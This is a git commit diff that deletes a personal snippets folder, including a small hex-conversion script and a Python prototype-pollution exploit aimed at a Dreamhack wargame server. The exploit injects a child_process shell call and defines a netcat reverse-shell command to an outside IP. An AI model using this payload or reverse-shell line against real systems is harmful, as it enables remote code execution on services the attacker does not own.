d3a578ad27d9171ba7f6eab64e67aa6d52177b3c
Sean <63111096+seanjungkm@users.noreply.github.com>
2022-10-30 18:41:05 +0900

    Delete shawnrepo/00.Command directory

--- shawnrepo/00.Command/Python/hex.py
+++
@@ -1,3 +0,0 @@
-hex_val = 'aafc00002c01'
-
-print(int(hex_val, 16))
--- shawnrepo/00.Command/Python/pollution.py
+++
@@ -1,9 +0,0 @@
-import requests
-
-cmd = 'nc 115.23.241.49 -p 6666 -e /bin/sh'
-# pollute
-requests.post('http://host1.dreamhack.games:19826/', files = {'__proto__.outputFunctionName': (
-    None, f"x;console.log(1);process.mainModule.require('child_process').exec('/bin/sh');x")})
-
-# execute command
-requests.get('http://host1.dreamhack.games:19826/')
